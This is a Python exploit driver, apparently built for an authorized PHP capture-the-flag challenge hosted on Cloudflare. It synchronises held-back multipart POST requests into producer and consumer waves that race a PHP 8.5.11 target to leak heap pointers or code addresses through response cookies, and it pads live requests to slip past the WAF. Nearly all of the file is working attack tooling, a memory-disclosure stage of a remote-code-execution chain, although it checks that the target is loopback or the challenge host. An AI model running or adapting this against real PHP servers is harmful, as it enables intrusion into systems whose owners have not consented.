#!/usr/bin/env python3
"""Held-last-byte leak discriminator for the authorized Cloudflare PHP CTF.

This driver combines the current PHP 8.5.11 KillaBoi producer/consumer shapes
with the synchronization used by the public fanout solve: every request is
connected and uploaded except for its final byte before the producer wave is
released.  Consumer requests are already staged when the producer responses
finish, minimizing the arm-to-consume interval without relying on affinity.

The script is leak-only.  It has no command-execution or verification path.
Live use is restricted to the challenge's published HTTPS POST endpoint and
requires --authorized-live.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import hashlib
import json
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from collections import Counter
from pathlib import Path


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))

import hybrid8511 as h  # noqa: E402


LOOPBACK = {"127.0.0.1", "localhost", "::1"}
LIVE_HOST = "php-rce.cloudflare.app"
LIVE_PATH = "/php/index.php"
TRANSIENT_DISCONNECT = b"Container suddenly disconnected, try again"
LOAD_MARKERS = (
    b"container overloaded",
    b"try again later",
    b"taking too long to accept",
    b"application could be overwhelmed",
    b"error proxying request to container",
)
STOP_CLASS_REASONS = {
    "managed_block_403": "managed WAF block (403; suppression phase unknown)",
    "transient_container_disconnect_500": (
        "known transient container disconnect (500)"
    ),
    "load_backoff": "429/503/load response",
    "generic_500": "generic HTTP 500 response",
    "transport_incomplete": "incomplete HTTP transport",
    "other_policy_stop": "other policy-stop response",
}
CONTENT_TYPE_TEMPLATES = {
    "canonical": "multipart/form-data; boundary={boundary}",
    "boundaryx": "multipart/form-data; boundaryx={boundary}",
}


def request_envelope(variant: str, boundary: bytes) -> dict:
    """Render one pinned multipart Content-Type without header injection."""
    try:
        template = CONTENT_TYPE_TEMPLATES[variant]
    except KeyError as error:
        raise ValueError(f"unsupported Content-Type variant: {variant!r}") from error
    boundary_text = boundary.decode("ascii")
    value = template.format(boundary=boundary_text)
    if "\r" in value or "\n" in value:
        raise ValueError("Content-Type value cannot contain CR or LF")
    return {
        "content_type_variant": variant,
        "content_type_template": template,
        "content_type_value": value,
        "multipart_bodies_modified": False,
    }


def receive_raw_complete(
    sock: socket.socket,
    cap: int = 2 << 20,
    ready: threading.Event | None = None,
) -> tuple[bytes, bool]:
    """Read bounded raw evidence and report whether the peer closed cleanly."""
    data = bytearray()
    eof = False
    if ready is not None:
        ready.set()
    while len(data) < cap:
        try:
            chunk = sock.recv(min(65536, cap - len(data)))
        except (socket.timeout, ssl.SSLError):
            break
        if not chunk:
            eof = True
            break
        data.extend(chunk)
    return bytes(data), eof


def receive_raw(sock: socket.socket, cap: int = 2 << 20) -> bytes:
    return receive_raw_complete(sock, cap)[0]


def _chunked_body_complete(body: bytes) -> bool:
    position = 0
    while True:
        line_end = body.find(b"\r\n", position)
        if line_end < 0:
            return False
        size_text = body[position:line_end].split(b";", 1)[0].strip()
        try:
            size = int(size_text, 16)
        except ValueError:
            return False
        position = line_end + 2
        if size == 0:
            while True:
                trailer_end = body.find(b"\r\n", position)
                if trailer_end < 0:
                    return False
                if trailer_end == position:
                    return trailer_end + 2 == len(body)
                position = trailer_end + 2
        if len(body) < position + size + 2:
            return False
        if body[position + size : position + size + 2] != b"\r\n":
            return False
        position += size + 2


def http_response_complete(raw: bytes, eof: bool) -> bool:
    """Validate one HTTP/1.x response using declared message framing."""
    header_end = raw.find(b"\r\n\r\n")
    if header_end < 0:
        return False
    head = raw[:header_end]
    body = raw[header_end + 4 :]
    lines = head.split(b"\r\n")
    if not lines or not lines[0].startswith(b"HTTP/1."):
        return False
    headers: dict[bytes, list[bytes]] = {}
    for line in lines[1:]:
        if b":" not in line:
            return False
        name, value = line.split(b":", 1)
        headers.setdefault(name.strip().lower(), []).append(value.strip())
    transfer = b",".join(headers.get(b"transfer-encoding", [])).lower()
    if transfer:
        codings = [item.strip() for item in transfer.split(b",")]
        return bool(codings) and codings[-1] == b"chunked" and _chunked_body_complete(body)
    lengths = headers.get(b"content-length", [])
    if lengths:
        if len(set(lengths)) != 1:
            return False
        try:
            expected = int(lengths[0])
        except ValueError:
            return False
        return expected >= 0 and len(body) == expected
    return eof


def response_entity(raw: bytes) -> bytes | None:
    """Return the HTTP entity body, decoding one bounded chunked response."""
    head, separator, body = raw.partition(b"\r\n\r\n")
    if not separator:
        return None
    headers: dict[bytes, list[bytes]] = {}
    for line in head.split(b"\r\n")[1:]:
        name, colon, value = line.partition(b":")
        if colon:
            headers.setdefault(name.strip().lower(), []).append(value.strip())
    transfer = b",".join(headers.get(b"transfer-encoding", [])).lower()
    if not transfer:
        return body
    codings = [item.strip() for item in transfer.split(b",")]
    if not codings or codings[-1] != b"chunked":
        return None
    position = 0
    entity = bytearray()
    while True:
        line_end = body.find(b"\r\n", position)
        if line_end < 0:
            return None
        size_text = body[position:line_end].split(b";", 1)[0].strip()
        try:
            size = int(size_text, 16)
        except ValueError:
            return None
        position = line_end + 2
        if size == 0:
            return bytes(entity)
        if len(body) < position + size + 2:
            return None
        entity.extend(body[position : position + size])
        if body[position + size : position + size + 2] != b"\r\n":
            return None
        position += size + 2


def classify_response(raw: bytes, summary: dict, response_complete: bool) -> dict:
    """Classify observed edge output without claiming an unobservable phase."""
    status = int(summary.get("status") or 0)
    entity = response_entity(raw)
    lowered = (entity or b"").lower()
    if not response_complete:
        response_class = "transport_incomplete"
    elif status == 403:
        response_class = "managed_block_403"
    elif (
        status == 500
        and entity is not None
        and entity.rstrip(b"\r\n") == TRANSIENT_DISCONNECT
    ):
        response_class = "transient_container_disconnect_500"
    elif status in (429, 503) or any(marker in lowered for marker in LOAD_MARKERS):
        response_class = "load_backoff"
    elif status == 500:
        response_class = "generic_500"
    elif summary.get("backoff"):
        response_class = "other_policy_stop"
    else:
        response_class = "http_response"
    policy_stop = response_class in STOP_CLASS_REASONS
    return {
        "response_class": response_class,
        "policy_stop": policy_stop,
        "response_suppressed": response_class == "managed_block_403",
        "suppression_phase": (
            "unknown" if response_class == "managed_block_403" else None
        ),
        "transient_disconnect": (
            response_class == "transient_container_disconnect_500"
        ),
        "load_backoff": response_class == "load_backoff",
        "generic_500": response_class == "generic_500",
        "transport_incomplete": response_class == "transport_incomplete",
    }


def stop_details(records: list[dict]) -> tuple[list[str], str | None]:
    """Return ordered unique stop classes and an evidence-accurate reason."""
    classes = list(
        dict.fromkeys(
            str(record.get("response_class"))
            for record in records
            if record.get("policy_stop")
        )
    )
    if not classes:
        return [], None
    reasons = [STOP_CLASS_REASONS.get(item, item) for item in classes]
    if len(reasons) == 1:
        return classes, reasons[0]
    return classes, "multiple stop responses: " + "; ".join(reasons)


class HeldRequest:
    def __init__(
        self,
        args: argparse.Namespace,
        body: bytes,
        boundary: bytes,
        label: str,
        extra_headers: dict[str, str] | None = None,
    ) -> None:
        self.args = args
        self.body = body
        self.label = label
        self.started = time.monotonic()
        self.request_envelope = request_envelope(
            getattr(args, "content_type_variant", "canonical"), boundary
        )
        raw = socket.create_connection((args.host, args.port), args.timeout)
        if args.tls:
            raw = ssl.create_default_context().wrap_socket(
                raw, server_hostname=args.host
            )
        raw.settimeout(args.timeout)
        self.sock = raw
        host = args.host if args.port in (80, 443) else f"{args.host}:{args.port}"
        extra = "".join(
            f"{name}: {value}\r\n" for name, value in (extra_headers or {}).items()
        )
        head = (
            f"POST {args.path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "User-Agent: cfctf-r8-held-leak/1\r\n"
            f"{extra}"
            f"Content-Type: {self.request_envelope['content_type_value']}\r\n"
            f"Content-Length: {len(body)}\r\n"
              "Connection: close\r\n\r\n"
        ).encode("ascii")
        self.sock.sendall(head + body[:-1])
        # The final byte is deliberately withheld.  Keep the exact instant at
        # which the incomplete body became fully staged so callers can bound
        # the edge-facing hold interval independently of connect/upload time.
        self.staged_monotonic = time.monotonic()
        self.last = body[-1:]

    def finish(self, barrier: threading.Barrier) -> dict:
        reader_ready = threading.Event()
        reader_result: dict[str, object] = {}

        def read_response() -> None:
            try:
                raw, response_eof = receive_raw_complete(
                    self.sock,
                    ready=reader_ready,
                )
                reader_result["raw"] = raw
                reader_result["response_eof"] = response_eof
            except Exception as error:
                reader_result["error"] = error
                reader_ready.set()

        reader = threading.Thread(
            target=read_response,
            name=f"held-response-{self.label}",
            daemon=True,
        )
        reader.start()

        def stop_reader() -> None:
            if not reader.is_alive():
                return
            try:
                self.sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            reader.join(timeout=1.0)

        try:
            if not reader_ready.wait(timeout=self.args.timeout):
                raise TimeoutError("response reader did not become ready")
            barrier.wait(timeout=self.args.timeout)
            self.sock.sendall(self.last)
            reader.join(timeout=max(0.1, self.args.timeout + 0.25))
            if reader.is_alive():
                stop_reader()
                raise TimeoutError("response reader did not finish")
            if reader_result.get("error") is not None:
                raise RuntimeError("response reader failed") from reader_result["error"]
            raw = reader_result.get("raw", b"")
            response_eof = bool(reader_result.get("response_eof", False))
            if not isinstance(raw, bytes):
                raise TypeError("response reader returned non-bytes data")
            return {
                "label": self.label,
                "raw": raw,
                "elapsed_s": round(time.monotonic() - self.started, 3),
                "request_body_sha256": hashlib.sha256(self.body).hexdigest(),
                "response_eof": response_eof,
                "response_complete": http_response_complete(raw, response_eof),
            }
        except Exception as error:  # transport evidence, never leak evidence
            return {
                "label": self.label,
                "raw": b"",
                "elapsed_s": round(time.monotonic() - self.started, 3),
                "request_body_sha256": hashlib.sha256(self.body).hexdigest(),
                "response_eof": False,
                "response_complete": False,
                "error": repr(error),
            }
        finally:
            stop_reader()
            try:
                self.sock.close()
            except OSError:
                pass

    def close(self) -> None:
        try:
            self.sock.close()
        except OSError:
            pass


def release_wave(requests: list[HeldRequest]) -> list[dict]:
    barrier = threading.Barrier(len(requests))
    with concurrent.futures.ThreadPoolExecutor(
        max_workers=len(requests)
    ) as executor:
        futures = [executor.submit(request.finish, barrier) for request in requests]
        return [future.result() for future in futures]


def record(row: dict) -> dict:
    raw = row.get("raw") or b""
    summary = h.response_summary(raw)
    cookie = h.cookie_from_raw(raw)
    response_complete = bool(row.get("response_complete", False))
    classification = classify_response(raw, summary, response_complete)
    parsed_status = summary["status"]
    result = {
        "label": row.get("label"),
        "status": 0 if classification["transport_incomplete"] else parsed_status,
        "elapsed_s": row.get("elapsed_s"),
        "attempt_id": summary["attempt_id"],
        "backoff": classification["policy_stop"],
        "oom": summary["oom"],
        "raw_bytes": len(raw),
        "response_sha256": hashlib.sha256(raw).hexdigest(),
        "cookie_bytes": len(cookie),
        "cookie_sha256": hashlib.sha256(cookie).hexdigest(),
        "response_eof": bool(row.get("response_eof", False)),
        "response_complete": response_complete,
        "request_body_sha256": row.get("request_body_sha256"),
        **classification,
    }
    if classification["transport_incomplete"]:
        result["parsed_status"] = parsed_status
    if row.get("error"):
        result["error"] = row["error"]
    return result


def write_private_receipt(path: Path, document: dict) -> None:
    """Create one fresh mode-0600 JSON receipt without overwrite races."""
    path.parent.mkdir(parents=True, exist_ok=True)
    descriptor = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
    try:
        with os.fdopen(descriptor, "w", encoding="utf-8") as stream:
            descriptor = -1
            json.dump(document, stream, indent=2)
            stream.write("\n")
            stream.flush()
            os.fsync(stream.fileno())
    finally:
        if descriptor >= 0:
            os.close(descriptor)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--stage", choices=("heap", "code"), required=True)
    parser.add_argument("--producers", type=int, default=8)
    parser.add_argument("--consumers", type=int, default=8)
    parser.add_argument("--rounds", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=60.0)
    parser.add_argument("--waf-preamble", type=int, default=0)
    parser.add_argument(
        "--content-type-variant",
        choices=tuple(CONTENT_TYPE_TEMPLATES),
        default="canonical",
    )
    parser.add_argument("--authorized-live", action="store_true")
    parser.add_argument("--out", required=True)
    args = parser.parse_args()

    parsed = urllib.parse.urlsplit(args.target)
    args.host = parsed.hostname or ""
    args.tls = parsed.scheme == "https"
    args.port = parsed.port or (443 if args.tls else 80)
    args.path = parsed.path or "/"
    local = args.host in LOOPBACK and not args.tls
    live = args.host == LIVE_HOST and args.tls and args.path == LIVE_PATH
    if not local and not (live and args.authorized_live):
        parser.error(
            "destination must be loopback or the exact public challenge with "
            "--authorized-live"
        )
    if args.path != LIVE_PATH:
        parser.error("path must be exactly /php/index.php")
    if not 1 <= args.producers <= 15 or not 1 <= args.consumers <= 15:
        parser.error("producer and consumer fanout must be in 1..15")
    if not 1 <= args.rounds <= 15:
        parser.error("rounds must be in 1..15")
    if live and args.waf_preamble < 1_048_437:
        parser.error("live requests require the measured WAF-safe preamble")

    h.kb.code_candidate = h.debian_code_candidate
    shape = h.kb.STAGES[args.stage]
    envelope = request_envelope(args.content_type_variant, h.kb.COOKIE_BOUNDARY)
    cookie_header = "".join(
        h.kb._cookie_name(index) + "=;" for index in range(h.kb.COOKIE_PAIRS)
    )
    began = time.monotonic()
    document = {
        "provenance": {
            "generator": "cfctf-r8-held-leak/2",
            "schema_validated": False,
        },
        "utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "scope": {
            "target": args.target,
            "live": live,
            "method": "POST",
            "stage": args.stage,
            "producers": args.producers,
            "consumers": args.consumers,
            "rounds": args.rounds,
            "hard_request_cap": args.rounds * (args.producers + args.consumers),
            "terminal_implemented": False,
            "verify_implemented": False,
        },
        "request_envelope": envelope,
        "waves": [],
        "verdict": "LEAK_MISS",
    }

    for round_index in range(1, args.rounds + 1):
        producer_body = h.add_preamble(
            h.kb.producer_body(shape), args.waf_preamble
        )
        consumer_body = h.add_preamble(
            h.kb.consumer_body(args.stage), args.waf_preamble
        )
        held: list[HeldRequest] = []
        try:
            producers = [
                HeldRequest(
                    args,
                    producer_body,
                    h.kb.COOKIE_BOUNDARY,
                    f"A{round_index:02d}-{index:02d}",
                    {"Cookie": cookie_header},
                )
                for index in range(args.producers)
            ]
            held.extend(producers)
            consumers = [
                HeldRequest(
                    args,
                    consumer_body,
                    h.kb.COOKIE_BOUNDARY,
                    f"B{round_index:02d}-{index:02d}",
                )
                for index in range(args.consumers)
            ]
            held.extend(consumers)
            producer_rows = release_wave(producers)
            consumer_rows = release_wave(consumers)
        finally:
            for request in held:
                request.close()

        producer_records = [record(row) for row in producer_rows]
        consumer_records = [record(row) for row in consumer_rows]
        cookies = [h.cookie_from_raw(row.get("raw") or b"") for row in consumer_rows]
        candidate = None
        landed_cookie = b""
        for cookie in cookies:
            found = (
                h.kb.heap_candidate(cookie)
                if args.stage == "heap"
                else h.kb.code_candidate(cookie)
            )
            if found is not None:
                candidate = found
                landed_cookie = cookie
                break
        wave = {
            "round": round_index,
            "producer_wire": len(producer_body),
            "consumer_wire": len(consumer_body),
            "producers": producer_records,
            "consumers": consumer_records,
            "candidate": candidate,
        }
        if args.stage == "heap" and candidate is not None:
            alignment = int(candidate.get("alignment", 0))
            groups: Counter[int] = Counter()
            for offset in range(alignment, len(landed_cookie) - 7, 8):
                value = int.from_bytes(landed_cookie[offset:offset + 8], "little")
                if 0x700000000000 <= value < 0x800000000000:
                    groups[value & ~((1 << 21) - 1)] += 1
            wave["pointer_groups"] = {
                hex(base): votes for base, votes in groups.most_common()
            }
        document["waves"].append(wave)

        records = producer_records + consumer_records
        statuses = [entry["status"] for entry in records]
        stop_classes, classified_stop_reason = stop_details(records)
        backoff = bool(stop_classes)
        if stop_classes:
            wave["stop_classes"] = stop_classes
        transport_failures = sum(status == 0 for status in statuses)
        print(
            f"round {round_index}/{args.rounds}: "
            f"A_oom={sum(entry['oom'] for entry in producer_records)}/"
            f"{args.producers} B_cookies={[len(cookie) for cookie in cookies]}"
            + (f" candidate={candidate}" if candidate else ""),
            flush=True,
        )
        if backoff or transport_failures * 2 >= len(statuses):
            document["verdict"] = "BACKOFF"
            document["stop_classes"] = (
                stop_classes if stop_classes else ["transport_incomplete"]
            )
            document["stop_reason"] = (
                classified_stop_reason or "majority transport failure"
            )
            break
        if candidate is not None:
            document["verdict"] = "STRICT_LEAK"
            document["candidate"] = candidate
            break
        if round_index != args.rounds:
            time.sleep(1.0)

    document["elapsed_s"] = round(time.monotonic() - began, 3)
    output = Path(args.out).resolve()
    write_private_receipt(output, document)
    print(json.dumps({
        "verdict": document["verdict"],
        "candidate": document.get("candidate"),
        "stop_reason": document.get("stop_reason"),
        "elapsed_s": document["elapsed_s"],
        "output": str(output),
    }, indent=2))
    return 0 if document["verdict"] == "STRICT_LEAK" else 2


if __name__ == "__main__":
    raise SystemExit(main())
